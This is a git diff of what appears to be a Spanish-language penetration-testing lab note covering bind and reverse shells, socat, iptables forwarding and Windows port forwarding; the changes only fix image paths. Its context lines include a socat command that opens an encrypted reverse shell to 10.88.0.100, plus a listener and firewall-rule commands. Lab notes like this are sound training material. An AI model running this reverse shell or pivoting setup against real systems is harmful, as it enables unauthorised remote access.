@@ -5,7 +5,7 @@ aliases:
 
 # Lab
 
-![image](../Imágenes/20240313134224.png)
+![image](../../../../Imágenes/20240313134224.png)
 
 ---
 
@@ -22,13 +22,13 @@ aliases:
 
 ## Bind Shell
 
-![image](../Imágenes/20240313134513.png)
+![image](../../../../Imágenes/20240313134513.png)
 
 ---
 
 ## Reverse Shell
 
-![image](../Imágenes/20240313134546.png)
+![image](../../../../Imágenes/20240313134546.png)
 
 ---
 
@@ -55,14 +55,14 @@ chmod 600 socat.key socat.pem
 socat file:`tty`,raw,echo=0 OPENSSL-LISTEN:6443,cert=socat.pem,cafile=socat.crt
 ```
 
-![image](../Imágenes/20240313135454.png)
+![image](../../../../Imágenes/20240313135454.png)
 
 
 ```shell
 #Conexión con socat 
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:10.88.0.100:6443,verify=0,cert=socat.pem,cafile=socat.crt
 ```
-![image](../Imágenes/20240313135539.png)
+![image](../../../../Imágenes/20240313135539.png)
 
 ```shell
 #Conexión con socat en Windows 
@@ -89,10 +89,10 @@ iptables -P FORWARD ACCEPT
 #Habilitar el enrutamiento. 
 sysctl net.ipv4.ip_forward=1
 ```
-![image](../Imágenes/20240319103200.png)
-![image](../Imágenes/20240319103229.png)
+![image](../../../../Imágenes/20240319103200.png)
+![image](../../../../Imágenes/20240319103229.png)
 
-![image](../Imágenes/20240319103253.png)
+![image](../../../../Imágenes/20240319103253.png)
 
 ```bash
 #Limpiar iptables. 
@@ -122,7 +122,7 @@ Permitir puerto 8080 en firewall de windows.
 `netsh advfirewall firewall add rule name="Input TCP Port 8080" dir=in action=allow protocol=TCP localport=8080`
 nota: Comando para vista 2008 o superior
 
-![image](../Imágenes/20240319103553.png)
+![image](../../../../Imágenes/20240319103553.png)
 
 Eliminar el port forward y la regla de firewall. 
 `netsh advfirewall firewall del rule name="Input TCP Port 8080"`
